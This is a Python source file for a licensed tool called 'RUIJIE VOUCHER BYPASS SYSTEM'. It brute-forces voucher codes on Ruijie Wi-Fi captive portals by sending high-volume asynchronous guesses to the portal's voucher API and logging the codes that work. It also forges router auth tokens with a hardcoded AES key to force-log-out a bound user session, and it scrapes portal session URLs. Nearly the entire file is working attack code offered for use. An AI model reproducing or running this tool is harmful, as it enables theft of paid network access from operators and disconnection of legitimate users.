import os
import re
import sys
import time
import json
import random
import string
import base64
import hashlib
import requests
import asyncio
import aiohttp
import urllib.parse
from threading import Thread
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# ==================== GLOBALS ====================
SUCCESS = 0
IN_RUNNING_ASCII_BIN = []
w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"
c = "\033[1;36m"

C_YELLOW = y
C_CYAN = c
C_RESET = w
C_BOLD = "\033[1m"
C_GREEN = g
C_RED = r
CURRENT_DEVICE_ID = None
LICENSE_REMAINING = "No License"
LICENSE_EXPIRY_TIMESTAMP = None

# ==================== LICENSE SYSTEM (PRESERVED - WILL WORK IN .SO) ====================
LICENSE_FILE = "license.key"
DEVICE_ID_FILE = ".device_id"

def get_device_id():
    """Get unique device ID - STABLE and PERSISTENT across runs"""
    global CURRENT_DEVICE_ID
    
    if os.path.exists(DEVICE_ID_FILE):
        try:
            with open(DEVICE_ID_FILE, "r") as f:
                saved_id = f.read().strip()
                if saved_id and len(saved_id) > 10:
                    CURRENT_DEVICE_ID = saved_id
                    return CURRENT_DEVICE_ID
        except:
            pass
    
    try:
        import subprocess
        device_uuid = None
        
        # Try multiple methods to get unique device ID
        try:
            with open("/system/build.prop", "r") as f:
                for line in f:
                    if "ro.build.fingerprint" in line:
                        device_uuid = line.split("=")[1].strip()
                        break
        except:
            pass
        
        if not device_uuid:
            try:
                result = subprocess.run(['getprop', 'ro.serialno'], capture_output=True, text=True)
                if result.stdout.strip() and result.stdout.strip() != "":
                    device_uuid = result.stdout.strip()
            except:
                pass
        
        if not device_uuid:
            try:
                import uuid
                device_uuid = str(uuid.getnode())
            except:
                pass
        
        if not device_uuid:
            try:
                result = subprocess.run(['settings', 'get', 'secure', 'android_id'], capture_output=True, text=True)
                if result.stdout.strip() and result.stdout.strip() != "":
                    device_uuid = result.stdout.strip()
            except:
                pass
        
        if not device_uuid:
            try:
                with open("/proc/sys/kernel/random/boot_id", "r") as f:
                    device_uuid = f.read().strip()
            except:
                pass
        
        if not device_uuid:
            try:
                hostname = subprocess.run(['hostname'], capture_output=True, text=True).stdout.strip()
                install_time = str(os.path.getctime(sys.executable)) if os.path.exists(sys.executable) else str(time.time())
                device_uuid = hashlib.md5(f"{hostname}-{install_time}".encode()).hexdigest()
            except:
                device_uuid = hashlib.md5(os.urandom(16)).hexdigest()
        
        raw_id = f"RUIJIE-{device_uuid}"
        hashed = hashlib.sha256(raw_id.encode()).hexdigest()[:16].upper()
        CURRENT_DEVICE_ID = f"ZHG-{hashed}"
        
        with open(DEVICE_ID_FILE, "w") as f:
            f.write(CURRENT_DEVICE_ID)
        
        return CURRENT_DEVICE_ID
        
    except Exception as e:
        if os.path.exists(DEVICE_ID_FILE):
            try:
                with open(DEVICE_ID_FILE, "r") as f:
                    CURRENT_DEVICE_ID = f.read().strip()
                    if CURRENT_DEVICE_ID:
                        return CURRENT_DEVICE_ID
            except:
                pass
        
        CURRENT_DEVICE_ID = f"ZHG-{hashlib.md5(os.urandom(16)).hexdigest()[:16].upper()}"
        with open(DEVICE_ID_FILE, "w") as f:
            f.write(CURRENT_DEVICE_ID)
        return CURRENT_DEVICE_ID

def verify_license(license_key):
    global LICENSE_REMAINING, LICENSE_EXPIRY_TIMESTAMP
    try:
        license_key = license_key.replace(" ", "").replace("\n", "").replace("\r", "").strip()
        
        parts = license_key.split('|')
        if len(parts) != 3:
            return False, "Invalid license format", None
        
        device_id_from_license = parts[0].strip()
        expiry_timestamp = int(parts[1].strip())
        signature = parts[2].strip()
        
        secret = "RUIJIE2024"
        expected_signature = hashlib.md5(f"{device_id_from_license}|{expiry_timestamp}|{secret}".encode()).hexdigest()[:16]
        
        if signature != expected_signature:
            return False, "Invalid license signature", None
        
        current_device = get_device_id()
        if device_id_from_license != current_device:
            return False, f"Device ID mismatch! Your Device: {current_device}", None
        
        LICENSE_EXPIRY_TIMESTAMP = expiry_timestamp
        
        if expiry_timestamp == -1:
            LICENSE_REMAINING = "Lifetime"
            return True, "Lifetime License", "Lifetime"
        
        current_time = int(time.time())
        
        if current_time > expiry_timestamp:
            LICENSE_REMAINING = "Expired"
            return False, "License has expired", None
        
        remaining_seconds = expiry_timestamp - current_time
        remaining_days = remaining_seconds // 86400
        remaining_hours = (remaining_seconds % 86400) // 3600
        remaining_minutes = (remaining_seconds % 3600) // 60
        remaining_secs = remaining_seconds % 60
        
        LICENSE_REMAINING = f"{remaining_days}D {remaining_hours}H {remaining_minutes}M {remaining_secs}S Left"
        
        return True, LICENSE_REMAINING, LICENSE_REMAINING
    
    except ValueError as e:
        return False, f"Invalid timestamp format", None
    except Exception as e:
        return False, f"Invalid license: {str(e)}", None

def save_license(license_key):
    with open(LICENSE_FILE, "w") as f:
        f.write(license_key.strip())

def load_license():
    try:
        with open(LICENSE_FILE, "r") as f:
            return f.read().strip()
    except:
        return None

def format_remaining_time():
    global LICENSE_EXPIRY_TIMESTAMP, LICENSE_REMAINING
    if LICENSE_EXPIRY_TIMESTAMP and LICENSE_EXPIRY_TIMESTAMP != -1:
        current_time = int(time.time())
        remaining_seconds = LICENSE_EXPIRY_TIMESTAMP - current_time
        if remaining_seconds <= 0:
            return "Expired"
        remaining_days = remaining_seconds // 86400
        remaining_hours = (remaining_seconds % 86400) // 3600
        remaining_minutes = (remaining_seconds % 3600) // 60
        remaining_secs = remaining_seconds % 60
        return f"{remaining_days}D {remaining_hours}H {remaining_minutes}M {remaining_secs}S Left"
    elif LICENSE_EXPIRY_TIMESTAMP == -1:
        return "Lifetime"
    return LICENSE_REMAINING

def check_license():
    global LICENSE_REMAINING, LICENSE_EXPIRY_TIMESTAMP
    license_key = load_license()
    
    if not license_key:
        print("\033[1;31m")
        print("=" * 60)
        print("  LICENSE REQUIRED")
        print("=" * 60)
        print("\033[1;33m")
        print("  This tool requires a valid license.")
        print("\033[0m")
        print(f"  Device ID: \033[1;32m{get_device_id()}\033[0m")
        print()
        print("  Please contact ZHANG to get a license key.")
        print("  Enter license key to continue:")
        print()
        
        try:
            license_input = input(f"  \033[1;33mLicense Key > \033[0m").strip()
        except KeyboardInterrupt:
            print(f"\n\033[1;33m[*] Exiting...\033[0m")
            return False
        
        if not license_input:
            print("\033[1;31m[!] No license provided. Exiting...\033[0m")
            return False
        
        valid, message, _ = verify_license(license_input)
        
        if valid:
            save_license(license_input)
            print(f"\033[1;32m[+] License accepted! {message}\033[0m")
            time.sleep(1)
            return True
        else:
            print(f"\033[1;31m[!] Invalid license: {message}\033[0m")
            time.sleep(2)
            return False
    else:
        valid, message, _ = verify_license(license_key)
        
        if not valid:
            print("\033[1;31m")
            print("=" * 60)
            print("  LICENSE EXPIRED OR INVALID")
            print("=" * 60)
            print("\033[0m")
            print(f"  {message}")
            print(f"\n  Please obtain a new license.")
            print(f"  Device ID: \033[1;32m{get_device_id()}\033[0m")
            
            if os.path.exists(LICENSE_FILE):
                os.remove(LICENSE_FILE)
            if os.path.exists(DEVICE_ID_FILE):
                os.remove(DEVICE_ID_FILE)
            
            time.sleep(2)
            return False
        
        return True

# ==================== ASCII BIN FILES (Handled safely for compilation) ====================
# These will be loaded at runtime - works in both .py and .so
def load_bin_file(filename):
    try:
        if os.path.exists(filename):
            with open(filename, "r") as f:
                return f.read().splitlines()
    except:
        pass
    return []

ascii_lower_bin6 = []
ascii_lower_bin7 = []
ascii_upper_bin6 = []
ascii_upper_bin7 = []
ascii_bin_mix6 = []
ascii_bin_mix7 = []

def init_bin_files():
    global ascii_lower_bin6, ascii_lower_bin7, ascii_upper_bin6, ascii_upper_bin7, ascii_bin_mix6, ascii_bin_mix7
    ascii_lower_bin6 = load_bin_file("ascii_lower_bin6.txt")
    ascii_lower_bin7 = load_bin_file("ascii_lower_bin7.txt")
    ascii_upper_bin6 = load_bin_file("ascii_upper_bin6.txt")
    ascii_upper_bin7 = load_bin_file("ascii_upper_bin7.txt")
    ascii_bin_mix6 = load_bin_file("ascii_bin_mix6.txt")
    ascii_bin_mix7 = load_bin_file("ascii_bin_mix7.txt")

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def Line():
    try:
        cols = os.get_terminal_size().columns
    except:
        cols = 80
    print(f"{y}-{w}" * cols)

def Logo():
    clear()
    print(f"""
    {c}███████╗██╗  ██╗ █████╗ ███╗   ██╗ ██████╗ 
    ╚══███╔╝██║  ██║██╔══██╗████╗  ██║██╔════╝ 
      ███╔╝ ███████║███████║██╔██╗ ██║██║  ███╗
     ███╔╝  ██╔══██║██╔══██║██║╚██╗██║██║   ██║
    ███████╗██║  ██║██║  ██║██║ ╚████║╚██████╔╝
    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝{w}
    >>>   {c}RUIJIE  VOUCHER  BYPASS  SYSTEM{w}   <<<
    """)
    print(f"{C_YELLOW}╔══════════════════════════════════════════════════════════════╗")
    print(f"║ {C_CYAN}Device ID     :{C_RESET} {C_BOLD}{C_GREEN}{get_device_id():<44}{C_RESET} {C_YELLOW}║")
    print(f"║ {C_CYAN}STATUS        :{C_RESET} {C_BOLD}{C_GREEN}{format_remaining_time():<44}{C_RESET} {C_YELLOW}║")
    print(f"{C_YELLOW}╚══════════════════════════════════════════════════════════════╝{C_RESET}\n")
    Line()
    print(f"{w}[*] This tool is created by ZHANG")
    print(f"{w}[*] Auto Setup & Brute Force Mode")
    Line()

def write_file(file, data):
    with open(file, "a") as f:
        f.write(data + "\n")

# ==================== SESSION HELPER ====================
async def get_session_id(session, session_url, previous_session_id):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.get(session_url, headers=headers) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response).group(1)
            return session_id
    except:
        return previous_session_id

# ==================== VOUCHER LOGIN ====================
async def login_voucher(session, session_id, voucher, file=None, check=False, debug=False):
    global SUCCESS
    data = {
        "accessCode": voucher,
        "sessionId": session_id,
        "apiVersion": 1
    }
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
    }
    try:
        async with session.post(post_url, json=data, headers=headers) as req:
            response = await req.text()
    except:
        return
    if 'logonUrl' in response:
        SUCCESS += 1
        print(f'{g}Success: {voucher}{w}')
        write_file("success.txt", voucher)
    elif 'expired' in response:
        if not check:
            print(f'{y}Expired: {voucher}{w}')
        write_file(file, voucher)
    elif 'failed' in response:
        if debug:
            print(f'{r}Failed: {voucher}{w}')
        write_file(file, voucher)
    elif 'STA' in response:
        if not check:
            print(f'{b}Limited: {voucher}{w}')
        write_file(file, voucher)

# ==================== GENERATORS ====================
def ascii_generator(mode, length):
    if mode == "digit":
        voucher = "".join(random.choice(string.digits) for _ in range(length))
        return voucher
    elif mode == "lowercase":
        voucher = "".join(random.choice(string.ascii_lowercase) for _ in range(length))
        if length == 6:
            if voucher not in ascii_lower_bin6 and voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        elif length == 7:
            if voucher not in ascii_lower_bin7 and voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        elif length == 8:
            if voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        elif length == 9:
            if voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        return ascii_generator(mode, length)
    elif mode == "uppercase":
        voucher = "".join(random.choice(string.ascii_uppercase) for _ in range(length))
        if length == 6:
            if voucher not in ascii_upper_bin6 and voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        elif length == 7:
            if voucher not in ascii_upper_bin7 and voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        elif length == 8:
            if voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        elif length == 9:
            if voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        return ascii_generator(mode, length)
    elif mode == "lowercase-number":
        voucher = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
        if length == 6:
            if voucher not in ascii_bin_mix6 and voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        elif length == 7:
            if voucher not in ascii_bin_mix7 and voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        elif length == 8:
            if voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        elif length == 9:
            if voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        return ascii_generator(mode, length)
    elif mode == "uppercase-number":
        voucher = "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))
        if length == 6:
            if voucher not in ascii_upper_bin6 and voucher not in ascii_bin_mix6 and voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        elif length == 7:
            if voucher not in ascii_upper_bin7 and voucher not in ascii_bin_mix7 and voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        elif length == 8:
            if voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        elif length == 9:
            if voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        return ascii_generator(mode, length)
    elif mode == "alphanumeric":
        voucher = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
        if length == 6:
            if voucher not in ascii_lower_bin6 and voucher not in ascii_upper_bin6 and voucher not in ascii_bin_mix6 and voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        elif length == 7:
            if voucher not in ascii_lower_bin7 and voucher not in ascii_upper_bin7 and voucher not in ascii_bin_mix7 and voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        elif length == 8:
            if voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        elif length == 9:
            if voucher not in IN_RUNNING_ASCII_BIN:
                return voucher
        return ascii_generator(mode, length)
    return "".join(random.choice(string.digits) for _ in range(length))

def read_success_codes():
    try:
        with open("success.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

# ==================== VOUCHER BRUTEFORCE CLASS ====================
class VoucherCode:
    def __init__(self, mode=None, length=None, speed=None, tasks=None, debug=True):
        self.mode = mode
        self.length = length
        self.speed = speed
        self.tasks = tasks
        self.debug = debug
        self.running = True
        if self.mode == "digit":
            self.file = f"failed{self.length}.txt"
        elif self.mode == "lowercase":
            self.file = f"ascii_lower_bin{self.length}.txt"
        elif self.mode == "uppercase":
            self.file = f"ascii_upper_bin{self.length}.txt"
        elif self.mode in ["lowercase-number", "uppercase-number"]:
            self.file = f"ascii_bin_mix{self.length}.txt"
        elif self.mode == "alphanumeric":
            self.file = f"alphanumeric_bin{self.length}.txt"
        elif self.mode == "success-code":
            self.file = "success.txt"
        try:
            self.session_url = open(".session_url", "r").read().strip()
        except:
            print(f"{r}[!] Session URL not found. Running setup...{w}")
            raise Exception("Setup required")

    async def execute_digit(self):
        global IN_RUNNING_ASCII_BIN
        connector = aiohttp.TCPConnector(limit=self.speed)
        timeout = aiohttp.ClientTimeout(total=20)
        Logo()
        
        total_possible = 10 ** self.length
        print(f"[*] Total possible: {total_possible:,}")
        print(f"[*] Mode: {self.mode}, Length: {self.length}, Speed: {self.speed}, Tasks: {self.tasks}")
        print(f"{y}[*] Press Ctrl+C to stop and return to menu{w}")
        Line()
        
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                loop = 0
                while self.running:
                    voucher = "".join(random.choice(string.digits) for _ in range(self.length))
                    
                    try:
                        with open(self.file, "r") as f:
                            if voucher in f.read():
                                continue
                    except:
                        pass
                    try:
                        with open("success.txt", "r") as f:
                            if voucher in f.read():
                                continue
                    except:
                        pass
                    
                    if loop % 90 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    
                    task = asyncio.create_task(login_voucher(session, session_id, voucher, file=self.file, debug=self.debug))
                    tasks.append(task)
                    
                    if len(tasks) >= self.tasks:
                        await asyncio.gather(*tasks)
                        tasks = []
                    loop += 1
                    IN_RUNNING_ASCII_BIN.append(voucher)
                    
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"\n{r}[!] Error: {e}{w}")
        finally:
            if tasks:
                try:
                    await asyncio.gather(*tasks)
                except:
                    pass
            await asyncio.sleep(0.5)

    async def execute_ascii(self):
        global IN_RUNNING_ASCII_BIN
        connector = aiohttp.TCPConnector(limit=self.speed)
        timeout = aiohttp.ClientTimeout(total=20)
        Logo()
        print(f"[*] Mode: {self.mode}, Length: {self.length}, Speed: {self.speed}, Tasks: {self.tasks}")
        print(f"{y}[*] Press Ctrl+C to stop and return to menu{w}")
        Line()
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                loop = 0
                while self.running:
                    voucher = ascii_generator(self.mode, self.length)
                    if loop % 90 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    
                    task = asyncio.create_task(login_voucher(session, session_id, voucher, file=self.file, debug=self.debug))
                    tasks.append(task)
                    
                    if len(tasks) >= self.tasks:
                        await asyncio.gather(*tasks)
                        tasks = []
                    loop += 1
                    IN_RUNNING_ASCII_BIN.append(voucher)
                    
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"\n{r}[!] Error: {e}{w}")
        finally:
            if tasks:
                try:
                    await asyncio.gather(*tasks)
                except:
                    pass
            await asyncio.sleep(0.5)

    async def execute_success_code(self):
        success_codes = read_success_codes()
        if not success_codes:
            Logo()
            print(f"{r}[!] No success codes found in success.txt{w}")
            await asyncio.sleep(2)
            return
        
        connector = aiohttp.TCPConnector(limit=self.speed)
        timeout = aiohttp.ClientTimeout(total=20)
        Logo()
        print(f"[*] Total success codes found: {len(success_codes)}")
        print(f"[*] Mode: Check Success Codes, Speed: {self.speed}, Tasks: {self.tasks}")
        print(f"{y}[*] Press Ctrl+C to stop and return to menu{w}")
        Line()
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                for i, voucher in enumerate(success_codes):
                    if not self.running:
                        break
                    if i % 90 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    
                    task = asyncio.create_task(login_voucher(session, session_id, voucher, file=self.file, check=True, debug=self.debug))
                    tasks.append(task)
                    
                    if len(tasks) >= self.tasks:
                        await asyncio.gather(*tasks)
                        tasks = []
                if tasks:
                    await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"\n{r}[!] Error: {e}{w}")
        finally:
            await asyncio.sleep(0.5)

    def stop(self):
        self.running = False

# ==================== SETUP WIFI CLASS ====================
class Setup:
    def __init__(self):
        self.baseurl = "http://zh4ng.duckdns.org:2060"
        self.username_get_url = self.baseurl + "/username_get"
        self.online_info_url = self.baseurl + "/user/online_info"
        self.logout_url = self.baseurl + "/user/logout"

    def encrypt_cryptojs(self, auth, enc_key):
        salt = get_random_bytes(8)
        key_iv = b''
        prev = b''
        while len(key_iv) < 48:
            prev = hashlib.md5(prev + enc_key.encode("utf-8") + salt).digest()
            key_iv += prev
        key = key_iv[:32]
        iv = key_iv[32:48]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded = pad(auth.encode("utf-8"), AES.block_size)
        cipher_text = cipher.encrypt(padded)
        encrypted = b"Salted__" + salt + cipher_text
        return base64.b64encode(encrypted).decode("utf-8")

    def extract_chap(self, data):
        match = re.search(r"chap_id=([^&]+)&chap_challenge=([^']+)", data)
        if not match:
            return None
        return {"chap_id": match.group(1), "chap_challenge": match.group(2)}

    def get_data(self):
        try:
            return requests.get(self.baseurl, timeout=10).text
        except:
            return None

    def get_auth(self, username):
        enc_key = "RjYkhwzx$2018!"
        data = self.get_data()
        if not data:
            print(f"{r}[!] Failed to get data from router{w}")
            return None
        chaps = self.extract_chap(data)
        if not chaps:
            print(f"{r}[!] Failed to extract chap data{w}")
            return None
        chap_id = urllib.parse.unquote(chaps["chap_id"])
        chap_challenge = urllib.parse.unquote(chaps["chap_challenge"])
        auth = chap_id + chap_challenge + username
        return self.encrypt_cryptojs(auth, enc_key)

    def username_get(self):
        try:
            return requests.get(self.username_get_url, timeout=10).json().get("username")
        except:
            return None

    def get_online_info(self, username):
        try:
            resp = requests.get(self.online_info_url, params={"username": username, "usertype": "wifidog"}, timeout=10).json()
            return resp["data"]["list"][0]
        except:
            return None

    def arrange_data(self, info):
        repmac = info["mac"].replace(":", "")
        repmac = [repmac[i:i+4] for i in range(0, len(repmac), 4)]
        mac_req = ".".join(repmac)
        return {"ip": info["ip"], "mac": info["mac"], "ip_req": info["ip"], "mac_req": mac_req}

    def logout(self, data, username):
        auth = self.get_auth(username)
        if not auth:
            return False
        payload = f"ip={data['ip']}&mac={data['mac']}&ip_req={data['ip_req']}&mac_req={data['mac_req']}&auth={auth}"
        try:
            resp = requests.post(self.logout_url, data=payload, timeout=10).json()
            return resp.get("success", False)
        except:
            return False

    def unbind(self):
        username = self.username_get()
        if not username:
            return False
        info = self.get_online_info(username)
        if not info:
            return False
        data = self.arrange_data(info)
        return self.logout(data, username)

    def run(self):
        print(f"{g}[+] Setting up WiFi...{w}")
        status = self.unbind()
        Line()
        if not status:
            print(f"{y}[!] Unbind failed, continuing anyway...{w}")
        else:
            print(f"{g}[+] Unbind successful{w}")
        time.sleep(2)
        Line()
        print(f"{g}[+] Fetching router info...{w}")
        try:
            localhost = requests.get("http://192.168.0.1", timeout=10).url
            ip_match = re.search(r'gw_address=(.*?)&', localhost)
            if not ip_match:
                raise Exception("Could not extract IP")
            ip = ip_match.group(1)
            headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) Chrome/139.0.0.0 Mobile Safari/537.36'}
            req = requests.get(localhost, headers=headers, timeout=10).text
            session_match = re.search(r"href='(.*?)'</script>", req)
            if not session_match:
                raise Exception("Could not extract session URL")
            session_url = "https://portal-as.ruijienetworks.com" + session_match.group(1)
            with open(".session_url", "w") as f:
                f.write(session_url)
            with open(".ip", "w") as f:
                f.write(ip)
            Line()
            print(f"{g}[+] Setup successful!{w}")
            return True
        except Exception as e:
            Line()
            print(f"{r}[!] Setup failed: {e}{w}")
            return False

# ==================== VOUCHER MENU ====================
def voucher_menu():
    clear()
    print(f"""
    {c}███████╗██╗  ██╗ █████╗ ███╗   ██╗ ██████╗ 
    ╚══███╔╝██║  ██║██╔══██╗████╗  ██║██╔════╝ 
      ███╔╝ ███████║███████║██╔██╗ ██║██║  ███╗
     ███╔╝  ██╔══██║██╔══██║██║╚██╗██║██║   ██║
    ███████╗██║  ██║██║  ██║██║ ╚████║╚██████╔╝
    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝{w}
    >>>   {c}RUIJIE  VOUCHER  BYPASS  SYSTEM{w}   <<<
    """)
    print(f"{C_YELLOW}╔══════════════════════════════════════════════════════════════╗")
    print(f"║ {C_CYAN}Device ID     :{C_RESET} {C_BOLD}{C_GREEN}{get_device_id():<44}{C_RESET} {C_YELLOW}║")
    print(f"║ {C_CYAN}STATUS        :{C_RESET} {C_BOLD}{C_GREEN}{format_remaining_time():<44}{C_RESET} {C_YELLOW}║")
    print(f"{C_YELLOW}╚══════════════════════════════════════════════════════════════╝{C_RESET}\n")
    Line()
    print(f"{w}[*] This tool is created by ZHANG")
    print(f"{w}[*] Auto Setup & Brute Force Mode")
    Line()
    print(f"{g}[1] Number only (0-9){w}")
    print(f"{g}[2] Lowercase Letters (a-z){w}")
    print(f"{g}[3] Uppercase Letters (A-Z){w}")
    print(f"{g}[4] Lowercase + Number (a-z,0-9){w}")
    print(f"{g}[5] Uppercase + Number (A-Z,0-9){w}")
    print(f"{g}[6] Alphanumeric (A-Z,0-9,a-z){w}")
    print(f"{g}[7] Success Code (.txt){w}")
    print(f"{r}[0] Exit{w}")
    Line()
    
    try:
        return input(f"{y}[?] Select voucher mode: {w}")
    except KeyboardInterrupt:
        print(f"\n{y}[*] Exiting...{w}")
        return "0"

def length_menu():
    clear()
    print(f"""
    {c}███████╗██╗  ██╗ █████╗ ███╗   ██╗ ██████╗ 
    ╚══███╔╝██║  ██║██╔══██╗████╗  ██║██╔════╝ 
      ███╔╝ ███████║███████║██╔██╗ ██║██║  ███╗
     ███╔╝  ██╔══██║██╔══██║██║╚██╗██║██║   ██║
    ███████╗██║  ██║██║  ██║██║ ╚████║╚██████╔╝
    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝{w}
    >>>   {c}RUIJIE  VOUCHER  BYPASS  SYSTEM{w}   <<<
    """)
    print(f"{C_YELLOW}╔══════════════════════════════════════════════════════════════╗")
    print(f"║ {C_CYAN}Device ID     :{C_RESET} {C_BOLD}{C_GREEN}{get_device_id():<44}{C_RESET} {C_YELLOW}║")
    print(f"║ {C_CYAN}STATUS        :{C_RESET} {C_BOLD}{C_GREEN}{format_remaining_time():<44}{C_RESET} {C_YELLOW}║")
    print(f"{C_YELLOW}╚══════════════════════════════════════════════════════════════╝{C_RESET}\n")
    Line()
    print(f"{w}[*] This tool is created by ZHANG")
    print(f"{w}[*] Auto Setup & Brute Force Mode")
    Line()
    print(f"{g}[6] Length 6{w}")
    print(f"{g}[7] Length 7{w}")
    print(f"{g}[8] Length 8{w}")
    print(f"{g}[9] Length 9{w}")
    Line()
    
    try:
        return input(f"{y}[?] Select length (6-9): {w}")
    except KeyboardInterrupt:
        print(f"\n{y}[*] Exiting...{w}")
        return "6"

def run_bruteforce():
    global current_voucher_obj
    while True:
        mode_choice = voucher_menu()
        
        if mode_choice == "0":
            print(f"{y}[*] Exiting...{w}")
            sys.exit(0)
        elif mode_choice == "1":
            mode = "digit"
        elif mode_choice == "2":
            mode = "lowercase"
        elif mode_choice == "3":
            mode = "uppercase"
        elif mode_choice == "4":
            mode = "lowercase-number"
        elif mode_choice == "5":
            mode = "uppercase-number"
        elif mode_choice == "6":
            mode = "alphanumeric"
        elif mode_choice == "7":
            mode = "success-code"
        else:
            print(f"{r}[!] Invalid choice{w}")
            time.sleep(1)
            continue

        if mode == "success-code":
            try:
                speed = int(input(f"{y}[?] Speed (default 100): {w}") or 100)
                tasks = int(input(f"{y}[?] Tasks (default 100): {w}") or 100)
                debug = input(f"{y}[?] Show debug? (y/n, default n): {w}").lower() == 'y'
            except KeyboardInterrupt:
                print(f"\n{y}[*] Returning to menu...{w}")
                continue
            except:
                speed, tasks, debug = 100, 100, False

            try:
                vobj = VoucherCode(mode=mode, length=6, speed=speed, tasks=tasks, debug=debug)
                current_voucher_obj = vobj
                await_loop = asyncio.new_event_loop()
                asyncio.set_event_loop(await_loop)
                try:
                    await_loop.run_until_complete(vobj.execute_success_code())
                except KeyboardInterrupt:
                    print(f"\n{y}[*] Stopped by user. Returning to menu...{w}")
                    vobj.stop()
                finally:
                    await_loop.close()
            except Exception as e:
                if "Setup required" in str(e):
                    print(f"{r}[!] Setup failed, please check your connection{w}")
                    sys.exit(1)
                print(f"{r}[!] Error: {e}{w}")
                time.sleep(2)
            continue

        length_choice = length_menu()
            
        if length_choice == "6":
            length = 6
        elif length_choice == "7":
            length = 7
        elif length_choice == "8":
            length = 8
        elif length_choice == "9":
            length = 9
        else:
            print(f"{r}[!] Invalid choice (6-9 only){w}")
            time.sleep(1)
            continue

        try:
            speed = int(input(f"{y}[?] Speed (default 100): {w}") or 100)
            tasks = int(input(f"{y}[?] Tasks (default 100): {w}") or 100)
            debug = input(f"{y}[?] Show debug? (y/n, default n): {w}").lower() == 'y'
        except KeyboardInterrupt:
            print(f"\n{y}[*] Returning to menu...{w}")
            continue
        except:
            speed, tasks, debug = 100, 100, False

        try:
            vobj = VoucherCode(mode=mode, length=length, speed=speed, tasks=tasks, debug=debug)
            current_voucher_obj = vobj
            await_loop = asyncio.new_event_loop()
            asyncio.set_event_loop(await_loop)
            try:
                if mode == "digit":
                    await_loop.run_until_complete(vobj.execute_digit())
                else:
                    await_loop.run_until_complete(vobj.execute_ascii())
            except KeyboardInterrupt:
                print(f"\n{y}[*] Stopped by user. Returning to menu...{w}")
                vobj.stop()
            finally:
                await_loop.close()
        except Exception as e:
            if "Setup required" in str(e):
                print(f"{r}[!] Setup failed, please check your connection{w}")
                sys.exit(1)
            print(f"{r}[!] Error: {e}{w}")
            time.sleep(2)

# ==================== MAIN ====================
if __name__ == "__main__":
    try:
        # Initialize bin files
        init_bin_files()
        
        # First check license
        if not check_license():
            sys.exit(1)
        
        Logo()
        print(f"{y}[*] Starting auto setup...{w}")
        Line()
        
        setup = Setup()
        success = setup.run()
        
        if not success:
            print(f"{r}[!] Setup failed! Please check your WiFi connection.{w}")
            print(f"{y}[*] Exiting...{w}")
            sys.exit(1)
        
        print(f"\n{g}[+] Setup completed! Starting bruteforce...{w}")
        time.sleep(1)
        run_bruteforce()
    except KeyboardInterrupt:
        print(f"\n{y}[*] Exiting gracefully...{w}")
        sys.exit(0)
